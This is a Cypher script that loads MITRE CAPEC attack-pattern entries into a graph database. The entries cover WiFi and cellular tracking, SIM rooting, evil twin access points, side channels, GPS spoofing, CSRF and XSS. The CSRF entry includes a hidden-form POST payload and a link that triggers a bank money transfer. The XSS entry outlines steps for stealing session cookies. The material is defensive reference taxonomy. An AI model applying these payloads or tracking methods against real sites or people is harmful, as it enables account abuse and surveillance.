CREATE (:Description{id: 550, summary: "OrderedDict([('Text', 'In this attack scenario, the attacker passively listens for WiFi messages and logs the associated Media Access Control (MAC) addresses. These addresses are intended to be unique to each wireless device (although they can be configured and changed by software). Once the attacker is able to associate a MAC address with a particular user or set of users (for example, when attending a public event), the attacker can then scan for that MAC address to track that user in the future.')])"});
MERGE (:CWE{id: 201});
CREATE (:AttackPattern{id: 613, name: "WiFi SSID Tracking", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 471, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 557});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 551, summary: "OrderedDict([('Text', 'In this attack scenario, the attacker passively listens for WiFi management frame messages containing the Service Set Identifier (SSID) for the WiFi network. These messages are frequently transmitted by WiFi access points (e.g., the retransmission device) as well as by clients that are accessing the network (e.g., the handset/mobile device). Once the attacker is able to associate an SSID with a particular user or set of users (for example, when attending a public event), the attacker can then scan for this SSID to track that user in the future.')])"});
MERGE (:CWE{id: 201});
CREATE (:AttackPattern{id: 614, name: "Rooting SIM Cards", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 472, text: "<div level=\"0\">\n  <p class=\"text\">A SIM card that relies on the DES cipher.</p>\n</div>"});
CREATE (:Submission{id: 558});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:PreviousEntryName{id: 95, name: "Rooting SIM CardS"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 552, summary: "OrderedDict([('Text', 'SIM cards are the de facto trust anchor of mobile devices worldwide. The cards protect the mobile identity of subscribers, associate devices with phone numbers, and increasingly store payment credentials, for example in NFC-enabled phones with mobile wallets. This attack leverages over-the-air (OTA) updates deployed via cryptographically-secured SMS messages to deliver executable code to the SIM. By cracking the DES key, an attacker can send properly signed binary SMS messages to a device, which are treated as Java applets and are executed on the SIM. These applets are allowed to send SMS, change voicemail numbers, and query the phone location, among many other predefined functions. These capabilities alone provide plenty of potential for abuse.')])"});
MERGE (:Reference{local_id: "R.614.1", author: "Karsten Nohl", title: "Rooting SIM Cards", publisher: "Security Research Labs", link: "https://srlabs.de/rooting-sim-cards/"});
MERGE (:CWE{id: 327});
CREATE (:AttackPattern{id: 615, name: "Evil Twin Wi-Fi Attack", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 473, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 559});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 553, summary: "OrderedDict([('Text', 'Adversaries install Wi-Fi equipment that acts as a legitimate Wi-Fi network access point. When a device connects to this access point, Wi-Fi data traffic is intercepted, captured, and analyzed. This also allows the adversary to act as a “man-in-the-middle” for all communications.')])"});
CREATE (:AttackPattern{id: 616, name: "Establish Rogue Location", status: "Stable", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 474, text: "<div level=\"0\">\n  <p class=\"text\">A resource is expected to available to the user.</p>\n</div>"});
CREATE (:Submission{id: 560});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Modification{id: 337});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses, Typical_Likelihood_of_Exploit"});
CREATE (:PreviousEntryName{id: 96, name: "Patiently Waiting at Incorrect Location"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 554, summary: "OrderedDict([('Text', 'An adversary provides a malicious version of a resource at a location that is similar to the expected location of a legitimate resource. After establishing the rogue location, the adversary waits for a victim to visit the location and access the malicious resource.')])"});
MERGE (:CWE{id: 200});
CREATE (:AttackPattern{id: 617, name: "Cellular Rogue Base Station", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 475, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 561});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 555, summary: "OrderedDict([('Text', 'In this attack scenario, the attacker imitates a cellular base station with his own “rogue” base station equipment. Since cellular devices connect to whatever station has the strongest signal, the attacker can easily convince a targeted cellular device (e.g. the retransmission device) to talk to the rogue base station.')])"});
CREATE (:AttackPattern{id: 618, name: "Cellular Broadcast Message Request", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 476, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have knowledge of the target’s mobile phone number.</p>\n</div>"});
CREATE (:Submission{id: 562});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 556, summary: "OrderedDict([('Text', 'In this attack scenario, the attacker uses knowledge of the target’s mobile phone number (i.e., the number associated with the SIM used in the retransmission device) to cause the cellular network to send broadcast messages to alert the mobile device. Since the network knows which cell tower the target’s mobile device is attached to, the broadcast messages are only sent in the Location Area Code (LAC) where the target is currently located. By triggering the cellular broadcast message and then listening for the presence of absence of that message, an attacker could verify that the target is in (or not in) a given location.')])"});
MERGE (:Reference{local_id: "R.618.1", author: "['Denis Foo Kune', 'John Koelndorfer', 'Nicholas Hopper', 'Yongdae Kim']", title: "Location Leaks on the GSM Air Interface", publisher: "University of Minnesota", link: "http://www-users.cs.umn.edu/~foo/research/docs/fookune_ndss_gsm.pdf"});
MERGE (:CWE{id: 201});
CREATE (:AttackPattern{id: 619, name: "Signal Strength Tracking", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 563});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 557, summary: "OrderedDict([('Text', 'In this attack scenario, the attacker passively monitors the signal strength of the target’s cellular RF signal or WiFi RF signal and uses the strength of the signal (with directional antennas and/or from multiple listening points at once) to identify the source location of the signal. Obtaining the signal of the target can be accomplished through multiple techniques such as through Cellular Broadcast Message Request or through the use of IMSI Tracking or WiFi MAC Address Tracking.')])"});
MERGE (:CWE{id: 201});
CREATE (:AttackPattern{id: 62, name: "Cross Site Request Forgery", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AlternateTerm{id: 3, term: "Session Riding"});
CREATE (:Submission{id: 564});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 338});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 339});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 340});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Alternate_Terms, Attack_Phases"});
CREATE (:Modification{id: 341});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:PreviousEntryName{id: 97, name: "Cross Site Request Forgery (aka Session Riding)"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 558, summary: "OrderedDict([('Text', [\"An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level.\", 'This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user\\'s system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply \"riding\" the existing session cookie.'])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Explore target website", description: "<div level=\"0\">\n  <p class=\"text\">The attacker first explores the target website to determine pieces of functionality that are of interest to him (e.g. money transfers). The attacker will need a legitimate user account on the target website. It would help to have two accounts.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use web application debugging tool such as WebScarab, Tamper Data or TamperIE to analyze the information exchanged between the client and the server</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use network sniffing tool such as Wireshark to analyze the information exchanged between the client and the server</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">View HTML source of web pages that contain links or buttons that perform actions of interest.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker identifies at least one piece of interesting functionality that can be executed by making a single HTTP GET or POST request containing no session-specific parameters."});
CREATE (:Outcome{id: 1, type: "Failure", description: "Attacker cannot identify any functionality that can be executed without sending a session-specific parameter other than the cookie in the HTTP request."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Create a link that when clicked on, will execute the interesting functionality.", description: "<div level=\"0\">\n  <p class=\"text\">The attacker needs to create a link that will execute some interesting functionality such as transfer money, change a password, etc.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Create a GET request containing all required parameters (e.g. https://www.somebank.com/members/transfer.asp?to=012345678901&amt=10000)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Create a form that will submit a POST request (e.g. <form method=\"POST\" action=\"https://www.somebank.com/members/transfer.asp\"><input type=\"hidden\" Name=\"to\" value=\"012345678901\"/><input type=\"hidden\" Name=\"amt\" value=\"10000\"/><input type=\"submit\" src=\"clickhere.jpg\"/></form></p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Success outcome in previous step.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failure outcome in previous step.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A link that performs an operation that the attacker desires when it is clicked."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Creating a link that performs an operation that the attacker desires when it is clicked, is impossible, because the site has implemented protections against CSRF."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Convince user to click on link", description: "<div level=\"0\">\n  <p class=\"text\">Finally, the attacker needs to convince a user that is logged into the target website to click on a link to execute the CSRF attack.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Execute a phishing attack and send the user an e-mail convincing him to click on a link.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Execute a stored XSS attack on a website to permanently embed the malicious link into the website.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Execute a stored XSS attack on a website where an XMLHTTPRequest object will automatically execute the attack as soon as a user visits the page. This removes the step of convincing a user to click on a link.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Include the malicious link on the attackers' own website where the user may have to click on the link, or where an XMLHTTPRequest object may automatically execute the attack when a user visits the site.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Success outcome in previous step.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failure outcome in previous step.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A user executes the malicious link crafted by the attacker."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Failure outcome in previous step."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Corrective"});
MERGE (:Reference{id: "REF-13", local_id: "R.62.1", author: "Thomas Schreiber", title: "Session Riding: A Widespread Vulnerability in Today's Web Applications", publisher: "SecureNet GmbH", pubdate: "Dec 2004", link: "http://www.securenet.de/papers/Session_Riding.pdf"});
MERGE (:CWE{id: 352});
MERGE (:CWE{id: 306});
MERGE (:CWE{id: 664});
MERGE (:CWE{id: 732});
MERGE (:CWE{id: 716});
CREATE (:ResourcesRequired{id: 253, text: "<div level=\"0\">\n  <p class=\"text\">All the attacker needs is the exact representation of requests to be made to the application and to be able to get the malicious link across to a victim.</p>\n</div>"});
CREATE (:AttackPattern{id: 620, name: "Drop Encryption Level", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 565});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Modification{id: 342});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 559, summary: "OrderedDict([('Text', 'An attacker forces the encryption level to be lowered, thus enabling a successful attack against the encrypted data.')])"});
MERGE (:CWE{id: 757});
CREATE (:AttackPattern{id: 621, name: "Analysis of Packet Timing and Sizes", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 477, text: "<div level=\"0\">\n  <p class=\"text\">Use of untrusted communication paths enables an attacker to intercept and log communications, including metadata such as packet timing and sizes.</p>\n</div>"});
CREATE (:Submission{id: 566});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 560, summary: "OrderedDict([('Text', 'An attacker may intercept and log encrypted transmissions for the purpose of analyzing metadata such as packet timing and sizes. Although the actual data may be encrypted, this metadata may reveal valuable information to an attacker. Note that this attack is applicable to VOIP data as well as application data, especially for interactive apps that require precise timing and low-latency (e.g. thin-clients).')])"});
MERGE (:CWE{id: 201});
CREATE (:AttackPattern{id: 622, name: "Electromagnetic Side-Channel Attack", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 478, text: "<div level=\"0\">\n  <p class=\"text\">Proximal access to the device.</p>\n</div>"});
CREATE (:Submission{id: 567});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 561, summary: "OrderedDict([('Text', ['In this attack scenario, the attacker passively monitors electromagnetic emanations that are produced by the targeted electronic device as an unintentional side-effect of its processing. From these emanations, the attacker derives information about the data that is being processed (e.g. the attacker can recover cryptographic keys by monitoring emanations associated with cryptographic processing).', 'This style of attack requires proximal access to the device, however attacks have been demonstrated at public conferences that work at distances of up to 10-15 feet. There have not been any significant studies to determine the maximum practical distance for such attacks. Since the attack is passive, it is nearly impossible to detect and the targeted device will continue to operate as normal after a successful attack.'])])"});
MERGE (:CWE{id: 201});
CREATE (:AttackPattern{id: 623, name: "Compromising Emanations Attack", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 479, text: "<div level=\"0\">\n  <p class=\"text\">Proximal access to the device.</p>\n</div>"});
CREATE (:Submission{id: 568});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 562, summary: "OrderedDict([('Text', 'Compromising Emanations (CE) are defined as unintentional signals which an attacker may intercept and analyze to disclose the information processed by the targeted equipment. Commercial mobile devices and retransmission devices have displays, buttons, microchips, and radios that emit mechanical emissions in the form of sound or vibrations. Capturing these emissions can help an adversary understand what the device is doing.')])"});
MERGE (:CWE{id: 201});
CREATE (:AttackPattern{id: 624, name: "Fault Injection", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AlternateTerm{id: 4, term: "Side-Channel Attack"});
CREATE (:AttackPrerequisite{id: 480, text: "<div level=\"0\">\n  <p class=\"text\">Physical access to the system</p>\n  <p class=\"text\">The adversary must be cognizant of where fault injection vulnerabilities exist in the system in order to leverage them for exploitation.</p>\n</div>"});
CREATE (:Submission{id: 569});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Modification{id: 343});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Alternate_Terms, Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Other_Notes, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:Description{id: 563, summary: "OrderedDict([('Text', 'The adversary uses disruptive signals or events (e.g. electromagnetic pulses, laser pulses, clock glitches, etc.) to cause faulty behavior in electronic devices. When performed in a controlled manner on devices performing cryptographic operations, this faulty behavior can be exploited to derive secret key information.')])"});
CREATE (:ResourcesRequired{id: 254, text: "<div level=\"0\">\n  <p class=\"text\">The relevant sensors and tools to detect and analyze fault/side-channel data from a system.</p>\n  <p class=\"text\">A tool capable of injecting fault/side-channel data into a system or application.</p>\n</div>"});
CREATE (:AttackPattern{id: 625, name: "Mobile Device Fault Injection", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 570});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 564, summary: "OrderedDict([('Text', 'Fault injection attacks against mobile devices use disruptive signals or events (e.g. electromagnetic pulses, laser pulses, clock glitches, etc.) to cause faulty behavior. When performed in a controlled manner on devices performing cryptographic operations, this faulty behavior can be exploited to derive secret key information. Although this attack usually requires physical control of the mobile device, it is non-destructive, and the device can be used after the attack without any indication that secret keys were compromised.')])"});
CREATE (:AttackPattern{id: 626, name: "Smudge Attack", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 481, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have physical access to the device.</p>\n</div>"});
CREATE (:Submission{id: 571});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 565, summary: "OrderedDict([('Text', 'Attacks that reveal the password/passcode pattern on a touchscreen device by detecting oil smudges left behind by the user’s fingers.')])"});
CREATE (:AttackPattern{id: 627, name: "Counterfeit GPS Signals", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 482, text: "<div level=\"0\">\n  <p class=\"text\">The target must be relying on valid GPS signal to perform critical operations.</p>\n</div>"});
CREATE (:Submission{id: 572});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Modification{id: 344});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:Description{id: 566, summary: "OrderedDict([('Text', 'An adversary attempts to deceive a GPS receiver by broadcasting counterfeit GPS signals, structured to resemble a set of normal GPS signals. These spoofed signals may be structured in such a way as to cause the receiver to estimate its position to be somewhere other than where it actually is, or to be located where it is but at a different time, as determined by the adversary.')])"});
CREATE (:ResourcesRequired{id: 255, text: "<div level=\"0\">\n  <p class=\"text\">Ability to create spoofed GPS signals.</p>\n</div>"});
CREATE (:AttackPattern{id: 628, name: "Carry-Off GPS Attack", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 483, text: "<div level=\"0\">\n  <p class=\"text\">The target must be relying on valid GPS signal to perform critical operations.</p>\n</div>"});
CREATE (:Submission{id: 573});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Modification{id: 345});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:Description{id: 567, summary: "OrderedDict([('Text', 'A common form of a GPS spoofing attack, commonly termed a carry-off attack begins with an adversary broadcasting signals synchronized with the genuine signals observed by the target receiver. The power of the counterfeit signals is then gradually increased and drawn away from the genuine signals. Over time, the adversary can carry the target away from their intended destination and toward a location chosen by the adversary.')])"});
MERGE (:Reference{id: "REF-106", local_id: "R.628.1", title: "Wikipedia", section: "GPS Spooking", publisher: "The Wikimedia Foundation, Inc", link: "https://en.wikipedia.org/wiki/Spoofing_attack#GPS_Spoofing"});
CREATE (:AttackPattern{id: 629, name: "Unauthorized Use of Device Resources", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 574});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 568, summary: "OrderedDict([('Text', 'An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and .')])"});
CREATE (:AttackPattern{id: 63, name: "Cross-Site Scripting (XSS)", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 484, text: "<div level=\"0\">\n  <p class=\"text\">Target client software must be a client that allows scripting communication from remote hosts, such as a JavaScript-enabled Web Browser.</p>\n</div>"});
CREATE (:Submission{id: 575});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 346});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Prerequisites, Description Summary, Examples-Instances, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:PreviousEntryName{id: 98, name: "Simple Script Injection"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 569, summary: "OrderedDict([('Text', \"An adversary embeds malicious scripts in content that will be served to web browsers. The goal of the attack is for the target software, the client-side browser, to execute the script with the users' privilege level. An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute code and scripts. Web browsers, for example, have some simple security controls in place, but if a remote attacker is allowed to execute scripts (through injecting them in to user-generated content like bulletin boards) then these controls may be bypassed. Further, these attacks are very difficult for an end user to detect.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey the application for user-controllable inputs", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Inputs are used by the application or the browser (DOM)</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs, with their corresponding parameters (POST, GET, COOKIE, etc.) is created by the attacker."});
CREATE (:Outcome{id: 2, type: "Success", description: "A list of application user interface entry fields is created by the attacker."});
CREATE (:Outcome{id: 3, type: "Success", description: "A list of resources accessed by the application is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Probe identified potential entry points for XSS vulnerability", description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses the entry points gathered in the \"Explore\" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record results of manual input of XSS probes in known URLs.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a list of XSS probe strings to inject script into UI entry fields. If possible, the probe strings contain a unique identifier.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Use a list of XSS probe strings to inject script into resources accessed by the application. If possible, the probe strings contain a unique identifier.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The output of pages includes some form of a URL parameter. e.g., ?error=\"<foobar>'(){};=\" becomes \"<foobar>'(){}=\" in the title of the web page.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Input content becomes part of the web page.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Nothing is returned to the web page. It may be a stored XSS. The unique identifier from the probe helps to trace the flow of the possible XSS.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's cross-site scripting string is repeated back verbatim at some point in the web site (if not on the same page). Note that sometimes, the payload might be well encoded in the page, but wouldn't be encoded at all in some other section of the same web page (title, script, etc.)"});
CREATE (:Outcome{id: 2, type: "Failure", description: "All HTML-sensitive characters are consistently re-encoded before being sent to the web browser."});
CREATE (:Outcome{id: 3, type: "Inconclusive", description: "Some sensitive characters are consistently encoded, but others are not."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Steal session IDs, credentials, page content, etc.", description: "<div level=\"0\">\n  <p class=\"text\">As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the user's cookies or other session identifiers."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker gets the content of the page the user is viewing."});
CREATE (:Outcome{id: 3, type: "Success", description: "The attacker causes the user's browser to visit a page with malicious content."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
